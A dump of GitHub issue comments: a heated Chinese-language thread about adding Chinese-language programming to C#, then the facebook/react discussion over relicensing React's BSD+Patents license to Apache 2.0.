       再回到所谓的中文编程的可行性和价值，可行吗？当然可行。但是代价呢？有哪家公司希望员工用中文编程呢，敲好几个按键才能出来一个汉字，还不算检字的时间。以这样的效率，你指望中国的公司拿什么参与国际竞争呢？BAT做到今天这个水平，都被你视为没有成绩的公司，如果用中文编程，不敢想象。
      计算机程序的本质是数学，和你中学用那些符号做计算没啥区别。如果你非要纠结这些东西，那么极限符号、积分符号、都不是国货，你也要用中文？所以你的纠结没有价值。
      计算机程序的价值是解放人类提高工作效率，而你的诉求能带来效率吗？不能。没有效率能提升竞争力吗？也不能。既然没有价值，那么谁会愿意为你做这个所谓的中文编程呢？何况看你这个意思，还指望国际友人免费提供。。。
      最后，多读书吧，涨涨见识没坏处。
      PS：你和那个人一定会来喷我，我不会反驳你们。今天让我感到悲哀的是，一群人没有让一个人醒悟，反而还引来了队友。。。一个人说你错了，你可以坚信你是对的，所有人说你错了，你好歹过过脑子反思一下？意淫虽然无罪，但毕竟有害，祝你能获得新知。"
2674	"我从中学开始学英语一直到大学毕业都没学好，怎么知道没学，英语盲。没办法，看见字母就困。还有虽然我不会英语但编程不会比你差。你会打汉字吧不知道要敲几个键才能出一个汉字？
打汉字有你说的那么慢？谁希望国际友人提供免费的帮助了，这是给他们提问题，在帮助他们设计产品。还没收他们咨询费呢。我不单单希望他们出汉语版的C#也希望能出西班牙的日语的德语的法语的。。。"
2675	"@htwx
兄弟,不要紧,这根本不是你的问题,而是你热爱我们种族的文化,我们的文字,我们的国学.
你看我刚刚的文章,他们以为没有`价值`,但他们忽略了中国庞大的市场和人口数量潜力,还有未来不可估量的发展容量和广阔的空间."
2676	说看到字母就犯困的那位，以后请不要使用拼音了
2677	不好意思拼音我也不好，但是是从小学开始就学了，总算没白学，学了10年英文对我来说就白学了。其他方面你还不一定赶上我，57分的英语本人照样上大学，照样毕业，还不是在大学生烂大街的年代。单词基本不认识我照样编程。**你可知道你眼中的这些程序员花了多少努力达到现在这个水平么**这个我还真知道，自学这些年看遍了到处求爷爷告奶奶的问各种各样的简单到不能再简单的问题，为了1个错误鼓捣好几天解决不了。他们就没想想这是为什么，真的有这么难么？学过了就知道根本不是这样，如果没有语言障碍，99%的错误提示都能解决遇到的问题。可惜就是不认识。你说编程或计算机技术的本质是数学，没错，可更多的是业务是逻辑。一个程序涉及到几个核心算法，设计好了框架，剩下的基本就是搬砖工的水平，我看了C# 罗斯林的 全部代码 TS的全部代码还没发现我不能理解的算法，可能是让我设计我做不出来但是理解他是完全够用的，ts编译器10w行代码有7w以上是搬砖工的水平就可以胜任。如果百度，阿里，腾讯的程序是中文代码写的他们的开发成本瞬间下降1半，人工成本不会超过现在的1半。这里一定有人说什么用中文编程就不能应用尖端技术了，就封闭了就跟不上时代了，就与世界不能接轨了。实际上根本就没有关系，英文难道翻译不成中文么，只要1部分框架师级别的能跟上就行了。其他的都是搬砖的就可以了。时间长了中文编程的生态也就出来了，搬砖工也就可以成为框架师了。
2678	"@htwx

兄弟,推荐你搜索  **城市小资产阶级精致利己主义**.

https://www.zhihu.com/question/34118042/answer/244406984"
2679	这个没办法，没有多少人知道100w人口的城市连5线都算不上，还有1半人在农村的国家发展起来是什么概念，世界也没有经历过这样的时代。说是960万平方公里，但人口基本都在东部不到50%的范围内是什么情况。
2680	把整个.net类库都翻译成中文别名了，反射时还是避免不了英文，而且甚至不知道这个别名对应哪个英文。
2681	这个问题不存在，现有技术就能解决。反射也就是基于元数据的。我的设想是这个语言能实现各种语言间的无缝转换，也就是你用中文写代码并不影响你把代码给美国人看。技术上现在可以实现，就是工作量比较大。
2682	毕竟程序就是个结构化的文档，自然语言都能翻译了，这种结构化的东西，没半点难度。虽然调整的东西很多，肯定不单单是.net， 甚至要调整MSIL，CLR等等，如果实现了受益的一定不单单是汉语的，日语的，德语的，西班牙语的。哪管只是有这样的接口也行啊，毕竟有些东西是可以社区完成的。
2683	反而有难度的翻译是程序的注释。这个的准确率远远的低于标识符和关键字
2684	也就是说还要翻译第三方类库的注释？那我觉得没必要做这个，因为vs可以自己写翻译注释的插件。。。
2685	"就是说你写的程序 不管是用什么语言写的都可以无缝转换，修改CLR就行了。程序语言里的词汇，如果联系上下文语境，翻译起来根本不需要人参与。最多发布方写点注释。自己翻译和机器翻译使用体验还是差距很大，关键是翻译的准确率，有时候中国人写的英文注释看起来更糟糕。早先还有硬件限制，现在连手机都硬件过剩了。需要严格控制体积的就剩病毒了。这个东西增加个选项就好了有这方面需求的就可以转化成母语，你说我是中国的但是就想看英文的也行啊，可能最多在选项里打个勾的事。这个当然不局限于官方的 .net 核心类库,是指所有的运行于.net的语言都能实现。
**这里强调一遍：我不是求微软给我们做个中文C#，现在这个.net真的是快落伍了。**
语言文字是沟通的基础，国人为了能和世界接轨从小学就开始学习外语，但是不是所有人学了就学会了就能讲了。讲了就能融入了。每个民族都有自己的文化，自己的历史，自己的局限性。百花齐放才是未来。现在微软也好谷歌也好百度也好都有自己的语言翻译服务。这就说明世界上不单单都是使用英文的，既然自然语言需要翻译，为什么程序语言就不需要，要学编程还要学2年外语，你多学2年数学、物理、化学、生物。。。不好么，语言现在有AI翻译，真的不是必须要学的东西了。当然你是专业搞翻译的还是要学，好好学，多学几种，能讲8国以上更好。"
2686	"@shisoft 我就。。。随便看看（

@Glavo 这位朋友还是别在这个 Issue 上浪费时间了，我觉得提出这个 Issue 的人表现出来的精神状态不是很健康（对事不对人）。。。"
2687	Since this issue is no longer contributing toward a suggestion for the C# language, closing it. If any of the contributors would like to continue the idea, I recommend forking Rolsyn and demonstrating how C# and its IDE can be extended to provide the requested support. We can then look at the PR and evaluate the idea.
2688	"From what I have heard, FB is not interested in pursuing the more draconian possibilities of the BSD+patents license. If that is true, there is actually very little difference between BSD+patents and the Apache license. As such, relicensing should make little if any pragmatic difference to Facebook.

Such a change, however, would make it much easier for license-cautious downstreamers. Please do consider making the change."
2689	@lacker no longer works at Facebook. I'm having a little trouble figuring out who would be best to route this to, but I'll look again on Monday. Thanks for raising this!
2690	RocksDB is now dual Apache 2.0 and GPL v2 licensed as of https://github.com/facebook/rocksdb/pull/2589
2691	https://news.ycombinator.com/item?id=14779881
2692	"Instead of switching license to Apache License 2.0 (ALv2), which is not liked by many people, is incompatible with GPLv2) and/or dual-licensing ALv2 + GPL mess, would Facebook consider changing a PATENT license once again to make termination clause look more like the patent license grant in ALv2:

> If You institute patent litigation against any entity (including a cross-claim or counterclaim in a lawsuit) alleging that the Work or a Contribution incorporated within the Work constitutes direct or contributory patent infringement, then any patent licenses granted to You under this License for that Work shall terminate as of the date such litigation is filed.

Would this satisfy ASF people?

Just to voice an opinion, in my and my company's software projects, I avoid dependencies that use ALv2, and I'm against relicensing away from the BSD-like license. I'd prefer that ASF would rewrite their software to not use dependencies that their lawyers say the can't use instead of persuading every project that they can't use to change license."
2693	We're only asking if the project would consider changing license. Apache CouchDB and others will switch away from react if we have to. We'd rather not, it's a lot of work for no real gain, but we don't have a choice. Changing license can be simple (RocksDB completed that change in a day).
2694	"> We're only asking if the project would consider changing license.

I understood that. My point is that instead of changing the license, would ASF and Facebook work to arrive at the acceptable PATENTS file?

(BTW, I'm not in any way related to the React project or Facebook Inc. apart from being the user.)"
2695	great question, will need a bod from ASF Legal to answer it. I'll point them here if I can.
2696	"@dchest What is it specifically that your company finds necessary to avoid in ALv2 that is not already present in the react license?

The existing PATENTS file is a point of consternation for many, not just ASF.  I think the point of this request is to alleviate licensing concerns that cause unnecessary roadblocks to adoption."
2697	"@nevetS due to *Oracle America, Inc. v. Google, Inc.* I avoid discussing any specifics about any licensing decisions in public or by email, so I'll leave it to other brave souls and/or lawyers. I only decided to voice my opinion here because I saw no opposing opinions posted, while in fact there are such.

The issue concerns changing the status quo to satisfy one organization's needs (but I'm sure there are others too) by re-licensing with the license written by this organization (sure, it's OSI-approved and widely used), with a history of alienating other open source (and ""free software"") projects. I don't want this to happen to React, so I'm trying to see if there's a middle ground by changing the PATENTS file is such a way that will satisfy both Facebook and ASF."
2698	Many people don't use React (and Immutable, etc.) because of the PATENTS file. The simplest solution would be to delete it from all of the Facebook repos.
2699	Modified GPL-like with share-alike patents clause?
2700	There has been recent, renewed awareness in medical research institutes about open source license compliance.  Legal review of open source software compliance often expressly asks for Apache 2.0 license precisely because it is a competently constructed and includes equitable patent grants.  Since U.S. based universities rely upon patent licensing as part of their legislatively mandated technology transfer initiatives, they are growing far more cautious in their due diligence.  For this reason, at some universities, software written with React may be shunned.  Existing projects using React software may be asked to remove the React software software dependency.  Please strongly consider this proposal, since our RexDB work is used at major universities, we do not wish to rework to use a React alternative.
2701	"@clarkevans thanks for your contribution to the discussion! As you said, the purpose of the review was ensuring compliance, that is protecting themselves from lawsuits. It's a worthy goal for any organization, but I doubt the effect of licenses on open source ecosystem was considered, and I think this effect is very important. Simple BSD-like licenses are known to cause less friction for open source projects. If the fact that Facebook granting additional patent rights (separately from copyright license) causes problems for some organizations, I think it's worth considering fixing the problem with patent grant instead of switching to the license that incorporates it.

Here's an example of a patent license which I *think* might work for everyone: https://github.com/golang/go/blob/master/PATENTS"
2702	"@dchest  I'm not a lawyer, but I'm not sure you can consider the BSD license independent of the additional patent grant, it's about intent, and patents file changes the intent.   Even Facebook's blog [1] refers to their license as BSD+Patents, ""We use a standard BSD license paired with an additional patent grant for most of our open source projects. For brevity, we call this combination the Facebook BSD+Patents license.""    This is further complicated by the recent revelation that the GPL is enforceable as a contract [2].  Please note that there is sufficient dissent at the Open Source Initiative that CC0 is not approved as an open source license [3].  Hence, I don't think that you can view BSD independently once the additional patent license is added since you can no longer assume there is implicit patent grant.

While the Apache 2.0 license may not be perfect, in the interest of unifying licenses, it's far better than adding yet another license.   Surely the OSI would reject Facebook's BSD+patent license if it were proposed.  So, in reality, you might want to instead consider React as ""non-free"" expressly because of this addition.  Lots of people add additional non-free clauses to the BSD license and propose it to the OSI each year, and in almost every case the license is rejected as not complying with open source standards.

[1] https://code.facebook.com/pages/850928938376556
[2] https://perens.com/blog/2017/05/28/understanding-the-gpl-is-a-contract-court-case/
[3] https://opensource.org/faq#cc-zero"
2703	As a further note, Google's gRPC was relicensed to Apache-2.0 as part of joining CNCF. They explained their reasoning here: https://www.cncf.io/blog/2017/02/01/cncf-recommends-aslv2/
2704	"OSI-approved alternatives to Facebook's license+grant combo also include UPL[1] and BSD+Patent[2], both of which are likely to be compatible with Apache's license. Where possible I suggest avoiding inventing yet more legal language.

[1] https://opensource.org/licenses/UPL
[2] https://opensource.org/licenses/BSDplusPatent
"
2705	"Regarding the vague fear by unnamed people that @dchest was talking about, establishing clear compatibility with the current Apache license is precisely one of the main reasons for GPL v3.

More concretely, writing yet another license for people to have to keep track of and analyze is simply silly. This is especially so if you write one that incorporates patent language ""just like"" the Apache language on top of the BSD model that is also ""just like"" the Apache language, except that the Apache license was updated based on feedback from competent legal counsel.

"
2706	"@nevetS 

I don't think that @dchest ever said that his company found anything problematic with the Apache license. He just said that he tries to avoid it in his work. That is completely different.

My (uninformed) guess is that his company has no problem with Apache apart from that sourced from Dmitriy himself."
2707	"From Minio team here we would like to see this change happen. Our object storage browser UI is based on react and we are Apache 2.0 licensed. 

It would be unfortunate and time consuming to migrate but we will have to do that in lieu of new information regarding Apache incompatibility. Please consider re-licensing React.

Thank you for your consideration.
"
2708	@harshavardhana I think you misunderstood the situation. The current license is *not* incompatible with ALv2. The situation is that Apache Software Foundation's lawyers ([correction](https://github.com/facebook/react/issues/10191#issuecomment-315671715): policy makers) declared that *their* projects will not use any dependencies licensed with BSD+Facebook's patent license, so their people filed this issue to convince Facebook to relicense it under ALv2. Many other people consider the current license and patent grant problematic, some companies also ban React for this reason. However, React is used by many more companies that don't have problems with it. See also https://github.com/omcljs/om/issues/882#issuecomment-315664114
2709	"Close, @dchest. It was not our lawyers that made this choice, but our *policy* decision to disallow the FB/BSD+Patent license to be mixed into the software the Foundation releases to users. And I don't think anybody expected a relicensing; this change was promulgated as an ""internal"" change in policy around this particular license.
"
2710	"> The current license is not incompatible with ALv2.

From the [apache discussion](https://issues.apache.org/jira/browse/LEGAL-303?focusedCommentId=16046579&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-16046579):

> Roy T. Fielding added a comment - 12/Jun/17 13:50
I have discussed that license with Facebook's legal counsel. It is not BSD (which relies on implied patent grants) and is intentionally incompatible with the Apache License.
"
2711	"The request to re-license was made politely, and was met with similar politeness by @gaearon (Thank you Dan for your understanding!)

There is no expectation of change on Apache CouchDB's part, but there is certainly a lot of hope for re-licensing to be achieved. And I'm hoping Dan can connect with people like @daveman692 to understand Facebook's internal reasoning and process for the expeditious change-of-heart around RocksDB's licensing."
2712	"@wohali sure, and I hope my comments are not considered impolite, if so — sorry, that wasn't my intention. It's important to note that ASF opinion is highly valued in the open source community, so while you opening the issue is a simple and polite request for the license change, the fact that the request is caused by ASF policy position — relicense or we'll stop using it — has an side effect of making other people fear the current license.

I hope that Facebook and ASF arrive at the mutually acceptable terms, however I would like to see the compromise in the form of the current BSD license plus a changed PATENTS file, rather than ALv2. I also hope that ASF itself proposes this as an option.

(That's pretty much all I had to say, so I'm unsubscribing from this thread.)"
2713	To give you a small update, there are going to be more internal discussions about this for about a week. This is about as much as I can say. I wouldn't be too optimistic about this changing for React but we'll see. @daveman692 has kindly agreed to provide an update when these discussions are over.
2714	So just to clarify here, there's a lot of conflicting information going around. Can software not be licensed under Apache-2.0 if it includes BSD+Patents dependencies? Or is this an internal policy for ASF that is making people nervous because it's a public statement of criticism from a well-respected foundation with lawyers knowledgable about open source licenses?
2715	This is the issue as I understand it: The React license's patent grant is narrower than Apache-2.0's, because it prohibits patent suits against Facebook that Apache-2.0 would not. The licenses are still compatible, in the sense that they can be used together within the same work. However, the overall license for that work (call it Apache+React), is less permissive than Apache-2.0 because of React's patent restrictions. It is Apache Software Foundation policy not to distribute software that cannot be licensed, as a whole, under the terms of Apache-2.0. Therefore, it will not accept the React license into its own project because it would make the project's license more restrictive than Apache-2.0.
2716	"@samuelhorwitz I think the following links might be helpful:

[ASF Legal Notice Regarding Facebook Patents+BSD/ROCKSDB License](https://issues.apache.org/jira/browse/LEGAL-303?focusedCommentId=16088663&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-16088663)

[Clarification of what this policy means for a particular project](https://issues.apache.org/jira/browse/LEGAL-303?focusedCommentId=16045097&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-16045097)

I don't believe there was judgement or criticism other than ""we cannot host any dependency with this license"" and ""we cannot allow software that we develop to be exclusively dependent on software that uses this license."" 

Nesting dependencies with varying licenses is a difficult task because of potential confusion.  At this point projects within the Apache Software Foundation can leverage react, but only if the end user downloads react separately, and only if there is an alternative.  This is not ideal.  Given that RocksDB's license was changed, and given that there is at least the impression that the intent behind the BSD+Patents license is very similar to the apache license, it seems a discussion is in order to determine if this situation can be resolved (potentially by adopting a different license in the way that RocksDB recently did).

@copiesofcopies laid it all out pretty clearly... but I had already put this together so... "
2717	"> the request is caused by ASF policy position — relicense or we'll stop using it — has an side effect of making other people fear the current license.

People _should_ fear it. If you build software that depends on React, Immutable, etc., many people can't use that software. The PATENTS file is poisoning the open source ecosystem by making its way into dependencies of dependencies."
2718	"React was originally published under the Apache 2.0 license. Some people may have depended on that license when they started using React ([perhaps Automattic for Calypso](https://github.com/Automattic/wp-calypso/issues/650#issuecomment-160422647)). 

So, what people are generally asking is essentially just for React (and related projects) to be under the original license when it was first released:
https://github.com/facebook/react/blob/75897c2dcd1dd3a6ca46284dd37e13d22b4b16b4/LICENSE

I do not know what the patent implications are given the original Apache License grant by Facebook for React, but they may be worth thinking about."
2719	"While we are at it, can we also throw [GraphQL](https://github.com/graphql/graphql-js), [Relay](https://github.com/facebook/relay), [React Native](https://github.com/facebook/react-native), [Flow](https://github.com/facebook/flow/) into the discussion as they also have the same license+patent format.
While they are not as popular as React, they are just as important to open source community and people using them and are often used together with React.

EDIT: Added Flow to the list."
2720	Other large companies such as mine (Adobe) can't use React, Pop, etc. for the very same reason.  We'd love to participate in the project, contribute to each etc. but Facebook's heavy-handed PATENTS clause is a showstopper.
2721	When in Rome... https://github.com/facebook/jest also please :)
2722	"Even mid-size companies like mine (ViaSat) are starting to disallow the use of Facebook's ""open-source"" projects for this reason. We'd like to build React web and native apps, but it seems that any sensible legal department will recommend against agreeing to Facebook's asymmetric patent grant."
2723	If we're compiling a list, Google also banned the use of React internally (despite many teams that wanted to adopt it) because of this PATENTS nonsense. (This may have changed since I left.) It's a ridiculous obstacle for a project that otherwise does so much to encourage community adoption. 
2724	The new patent grant (it changed once) was created specifically with feedback from Google, and last I heard their lawyers were happy with it. 
2725	~~So no consideration for the rest of us whose lawyers **weren't** happy with it? Poor form.~~
2726	"I'm not sure how possible this is, but what about the nuclear option of forking React from before the PATENTS file addition: 

https://github.com/facebook/react/commits/master/PATENTS

Seems like a huge waste but what else can people do if Facebook doesn't want to play ball?"
2727	"I am a Steering Council member of Project Jupyter, an open-source project that builds the Jupyter Notebook among other things (http://jupyter.org/). We are wanting to use react/immutable in a number of Jupyter repos, and the patents clause of FB licenses continue to cause problems for corporate/organizational users of Jupyter. For a lot of such users it isn't a problem (they are already using react) but for many they are frustrated that they have to get their lawyers involved to assess the risk of using Jupyter (if we use react). In a world where open-source has become the de-facto choice in many spheres it is really painful to be back in the land of ""we have to talk to our lawyers before...""

The Jupyter leadership is not convinced there is an actual problem with the FB patent clause, but the mere fact that this generates friction for institutional users of Jupyter is a huge problem. It is also artificially limiting the adoption and usage of react and other libraries under that license."
2728	"I just want to drop my personal opinion on this issue.
I personally think of open source world as a public library in real life.
It's where anybody from anywhere can freely access, gain knowledge and maybe, without any obligations, give back their knowledge in return.
It's where people help each other by sharing knowledge and make the world a better place.
I know it's very optimistic, but that's just how I feel about it.
I love using open source projects, and in return, I have created dozens of open source projects myself and licensed all of them with MIT license, which seems the simplest and most common option for people like me without any legal backgrounds.
Of course, it would be great if I can get something out of them, but in fact, I did already.
I've been using many other open source projects, and that's already my gain. I am merely trying to give back to the community. I feel like it's the right thing to do.
I really hope this React license issue doesn't become how Facebook can realign its license with certain large organizations like ASF or Google, but more about what's the right thing to do.
I like React and other projects from Facebook, but I can't help but feel like Facebook is trying to get something out of them by adding PATENTS clauses, even if they are only defensive as suggested.
It's like finding a small note in the most popular book in a public library saying ""If you ever read this book, in the future..."".
Maybe more than 90% of people shouldn't need to worry about it, but it's still something unpleasant thing to consider.
I love React and wish everybody can freely use it without worries."
2729	">So no consideration for the rest of us whose lawyers weren't happy with it? Poor form.

Excuse me, but I was replying to the [comment just above](https://github.com/facebook/react/issues/10191#issuecomment-316174344) that was specifically about Google.

I understand that everyone is frustrated about this issue. Personally I am just as frustrated to spend time, energy, and emotional wellbeing on legal mumbo jumbo that is preventing people from using React. I would much prefer to spend this time on working together to make it better.

But the reality of this situation is that the maintainers of React (people like me that you’re interacting on the issue tracker) are not the ones making these decisions. Each of us is doing what we can to show different perspectives on this issue to the people who can make those decisions, and we appreciate your feedback too. But we can only keep discussion open if everyone stays civil and respectful. Thanks."
2730	"@gaearon - Understood I misinterpreted the intent of your comment. 
Appreciate the clarification (and your efforts)."
2731	"Just to make sure this stays a bit grounded, the patent grant clause of the Apache 2.0 license is not substantively different from the existing Facebook patent grant policy. Certainly using something more standardized would be good, but anyone that is concerned about using React today should probably have equal concern about all FOSS software. The main difference is the revocation clause from Facebook is a lot more broad on which kinds of IP lawsuits will activate it, but the functional distinction is pretty small.

That said, srsly use something standardized, makes life easier on both sides."
2732	"I've never written a comment like this on any project in my life.  I'm unsure if hitting the ""comment"" button is a good idea or not. Please take everything I say below as meant respectfully. React is a wonderful ecosystem, we all want what is best for it, and I sincerely believe that everyone (including Facebook) is doing the best they can.

>  Personally I am just as frustrated that to spend time, energy, and emotional wellbeing on legal mumbo jumbo that is preventing people from using React.

> But we can only keep discussion open if everyone stays civil and respectful.

It goes without saying that the discussion remaining civil and respectful is paramount. It is clear that this situation isn't fun for anyone (including the devs & lawyers at facebook, all contributors to React and its ecosystem, and of course devs like myself who are blocked on using React/React Native based on the PATENTS situation).

That said, the sentiments expressed in the sentences I quoted above go to the very core of what is so lopsided and problematic about this situation.

That this is dismissed as legal mumbo jumbo is frankly frightening. React's ecosystem has snowballed to the point where it is incredibly important to  the future of literally all of software development. Software development has never been so important, and it affects real people in real ways. Facebook is a terrifyingly powerful force in technology, and by extension the world. As Facebook expands to more platforms as a dominant player and keeps React central to those expansions the true problems with the patent situation emerge.

For example, if Facebook dominates VR with a closed walled garden (as they are positioning to), and they happen to decide one must use React to develop for Facebook's VR platform, one must forfeit (company wide!) any legal standing with regards to patents vs. Facebook (one of the most powerful companies in the world!) in order to develop for the dominant platform of the day.  It's as if during Microsoft's era of dominance one had to forfeit all legal patent standing against Microsoft in order to create a windows application. I feel like a silly worry wart even typing this out but if you think through this all logically that is literally the situation we are in today.

Finally, the suggestion that if the tone of discussion around this issue gets heated that all discussion will be silenced is chilling. We're all passionate about software, we all obviously love react or we wouldn't be here, and many of us have poured countless hours into work that will have to be thrown out if this doesn't change. This is an extremely complicated situation with tons of different parties with tons of different concerns. Things getting heated is absolutely expected because we all care. I beg of everyone to keep discussion civil and mature, but the suggestion that if they don't this discussion will be silenced and this project will continue on the absolutely unacceptable status quo is a troubling thing to read."
2733	"> That this is dismissed as legal mumbo jumbo is frankly frightening.

I think you missed Gaeron's point. He is not dismissing the legal problems, just expressing that it is super frustrating for him to have to deal with the same arguments about this time and time and time again. He doesn't have magic power to change anything, as magical as he is. Instead he has to weather the storm of frustration about something he has no control over.

Personally, I would suggest that we leave this thread for substantial updates about the thread topic: whether React will be relicensed or not. There are so many platforms (twitter, medium, emailing Facebook legal counsel, hacker news, reddit etc etc) to express our passion on; I have put many hours into this issue at my company. The issues tracker is a poor tool for tracking the wide ranging discussion that this topic can produce, as has happened [in the past](https://github.com/facebook/react/issues/7293)"
2734	"I did not mean to dismiss the issue. I apologize if that’s how my previous comment reads. What I’m trying to say is that this is a bug tracker and not the best venue for legal discussion. Especially since most of us, as I presume, are not lawyers. You may see this thread as a way to say something to Facebook, but you’re talking to a team of a few people who are software developers like you.

We are currently keeping this issue open because there is an in-progress discussion. And we will notify you if there are any updates. However, we have always closed such issues in the past after initial discussion. This is not because we want to silence you, but because keeping it open forever does not achieve any purpose. We have heard you very well, and we have passed on your concerns. But repeating the same points over and over in different threads does not help move this forward, and creates a lot of noise and stress for the maintainers who are already empathetic to your cause.

The updates that happened in the past (such as updating grant in response to initial concerns from Google and other companies, or publishing FAQ to dispel common myths) happened outside of GitHub issues after much internal discussion. The legal team is re-evaluating these decisions every once in a while, and we’ll make sure they hear your voices. All I’m asking is that we treat each other with respect and keep this discussion level-headed while we wait for their decision. Thanks."
2735	"@gaearon, Is there an available venue for such a licensing discussion? 

I understand this may not be the best place for such a discussion, but it's open and folks like you are responsive. I don't know if there is any other option for such a conversation. 

While I appreciate there are internal discussions for Facebook to have on the matter, I would love an open forum for Facebook's legal group to engage with the React community on licensing. "
2736	@csepulv the Legal Team (*legalus humanus*) is an elusive kind, typically found in their natural private office habitat, often leaving only to hunt for food or provide for their shelter...
2737	"@coderanger 
> Just to make sure this stays a bit grounded, the patent grant clause of the Apache 2.0 license is not substantively different from the existing Facebook patent grant policy. Certainly using something more standardized would be good, but anyone that is concerned about using React today should probably have equal concern about all FOSS software. The main difference is the revocation clause from Facebook is a lot more broad on which kinds of IP lawsuits will activate it, but the functional distinction is pretty small.

My (non-lawyer) understanding of the distinction is that Apache 2.0 says ""this license grants you the right to use anything patented within this software under the terms of this license"" coupled with ""if you attempt to bring about patent lawsuits regarding anything in this software, then you lose all patents rights granted to you by this license"".

Whereas the argument is that the BSD+Patents clause says more along the lines ""if you attempt to bring patent litigation against Facebook at all, then all the rights to use the potential patents held on this software are lost"". This asymmetry is what people are concerned about because concerned parties argue this is the same as saying ""all your patents in exchange for using React"" since even though ""patents are evil etc etc"" there may be legitimate patent claims a company wishes to make at some point against Facebook or some affiliate.

To be fair to Facebook, I really doubt this stems from some sort of malice and more as a defensive measure against the ridiculous state of patent litigation these days, but that also doesn't change the legitimate concerns people have either.

Anyway once again, not a lawyer, but I thought I'd clear that up as outside of the GPL camps and other anti-commercial-open-source camps, the Apache license is regarded as a really good commercial open source license for it's explicit (symmetric) patent grant/litigation protection clause as well as it's explicit trademark protection clause, both of which are generally lacking in other good licenses such as MIT (and license modification is either expensive or done by someone who's not a lawyer as well as contributing to license eco-system complexity)."
2738	"@qxqxqxqx I think it is impolite to approach the issue as ""make FB change"". We would like them to, but it is not our place to demand that."
2739	I really hope fb reacts to the community requests to comply react-js and related libraries for an Apache license, it can become a hinderance for all those using react-js, to un-react it.
2740	@gstein I just want them know that we concern about this, if something is wrong with my means of expression, I apologize.
2741	"@gaearon First off, thank you for responding and for keeping things constructive. And please let me add that, as a maintainer of a developer-oriented piece of open source software, I sympathize with your desire to discuss code and features rather than licenses.

With that said, open source software is more than the code, the issue tracker, and releases. A key component of open source software is the licensing. So, when you write

> You may see this thread as a way to say something to Facebook, but you’re talking to a team of a few people who are software developers like you.

it feels like a simplification. Many commenters on this issue do not want to make a statement at Facebook Inc., the company. They want to discuss one important aspect of React, the framework. 

Now, I understand that software developers like us are not the best people to discuss legal details. However, wouldn't the logical consequence be that the Facebook Legal team, who make such decisions, become active in this forum? Shouldn't it be possible that *all* relevant details pertaining to a piece of open source software are discussed in the open? It is incredibly frustrating to have such an important aspect of open software discussed behind closed doors.
"
2742	"I apologize if the following has already been brought up.
It seems strange to me that there is so much fuss about an _additional grant_ on top of a widely used licence.
Why are all the legal departs of all these corporations that are mentioned in this thread not worried about _every other_ project licensed under BSD, MIT, GPLv2, and so on? If they're worried about this particular grant not going far enough, why seems _no grant at all_ be OK?
Maybe I'm missing something?"
2743	"> Maybe I'm missing something?

There is a general discussion going on if a license without an explicit patent grant carries an implied one and some people have the opinion it does."
2744	@cardamon Keeping this short. IANAL, but yes you (and it seems a lot of other discussions, including those referred to in #7293), are missing the concept of an implicit patent grant that those other projects (might) have, but which is missing here because the grant is explicit.   See http://en.swpat.org/wiki/Implicit_patent_licence
2745	"@cardamon I think that's why the Apache licence would be the preference.

BSD, MIT, et al would be a permissive licence but gives no grants on any patents that Facebook may have which cover React (or any other project).

Apache is a permissive licence, but it has the patent grand clause which gives users a licence to any related patents which Facebook holds, protecting them from being caught by patent infringement.

The difference between the Apache patent grant and Facebooks BSD+patent licence (as I understand it) is that the Facebook one is weighted more towards Facebook having defacto access to your patents as you loose your licence to the Facebooks possible React ones if you sue Facebook for _any_ patent infringement. Apache only cancels the patent grant if you sue based on any patents directly related to the project under licence.

Essentially:

- Apache would be best for most companies.
- Facebook's current licences is a lot like Apache, but the language is broader."
2746	@mitsuhiko @alexanderkjeldaas @matt-oakes Thanks for the clarifications.
2747	"I think that a major concern of technology companies evaluating this license is that compliance requires a burdensome -- maybe impossible -- degree of diligence. 

Let's say you're Cisco and some frontend developers in your router division use React in a router's admin interface. A year and a half later, your WebEx division notices that a new web-conferencing startup (call it ConfCo) appears to be using a compression technique that you've patented. You sue for a preliminary injunction. In discovery, you learn that ConfCo licensed its compression code from QuickFire, a Facebook subsidiary. Facebook turns around and files a counterclaim alleging that your previously-licensed use of React in your routers is infringing, because your patent license was terminated when you brought a suit ""against any party [ConfCo] if such Patent Assertion arises in whole or in part from any software, technology, product or service of Facebook or any of its subsidiaries or corporate affiliates.""

If you're Cisco's patent lawyer, this is the kind of scenario you envision when you read the React license. Now that you understand the risk, what kind of systems do you need to put in place in your organization to ensure that the WebEx lawyers know the risk before bringing the ConfCo suit? 

@cardamon @matt-oakes @mitsuhiko @alexanderkjeldaas"
2748	My team, at LinkedIn, is also having legal troubles using React for our internal projects. We would love to see a change on this front.
2749	"Hey all, thanks for your patience. The week is coming to an end, but unfortunately I don’t have any resolution for you yet.

Still, I want to point out that there is a real momentum behind this discussion internally. There are going to be more meetings next week escalating this up to the engineering directors. As you imagine they are quite busy, so this is taking more time than we thought.

Again, I can’t promise you any specific conclusion, and there is no clarity on where this will land. But please know there are people working on getting your voice heard.


"
2750	@gaearon probably the biggest pain point is the scenario described by @copiesofcopies [here](https://github.com/facebook/react/issues/10191#issuecomment-316380810). Is it possible to get clarification on it?
2751	Thanks for following up and for hearing us out, @gaearon!
2752	"@gaearon Regardless of the outcome or where anyone stands, being given any sort of communication that this issue is being given attention is very much appreciated.  

"
2753	"It did great damage to the community, and I am afraid that community will be split in the future.

Something like this might happen and no one will like it: 
```
React = Oracle JDK
Preact = OpenJDK
```

But we cannot blame facebook, because there is no doubt about the legal right .
"
2754	"> It did great damage to the community, and I am afraid that community will be split in the future.

i don't think that is true.. we have some years with React and with the Patent clause there and nothing of that has stopped its evolution, many big companies (with serious legal departments) are using it and many people are using it.. my opinion is that all of this is just ""fear"" about what could happen, or just that people think that facebook has somekind of ""conspiration plan"".

and please don't get me wrong.. i believe that the React community will be in much better place without that ""fear"", but saying that the community will be split because of this is just another probe of that ""fear"" and that the biggest issue is just the people that just like drama. 

let's hope that facebook will change the License/Patent of React, so some us can finally say that there is no ""conspiration theory"" or ""world domination plan"" here."
2755	"Well, sure, but one can't foresee the future. If there wasn't that patent clause, everybody would be happy and no ""sinister"" stuff could happen in future.
With that clause in place, one really can't be sure.
But if the worst happens, what would you do?
I consider this fear a healthy feeling. If not, look at Oracle vs Google Java saga just for an example."
2756	"To throw a little more info on the fire, here's my take if anyone is curious.  (tl;dr There is a lot of bad legal advice going around and way too much paranoia.  We're talking about a JS framework that takes functions and returns (almost) HTML.  This isn't an ARM license)

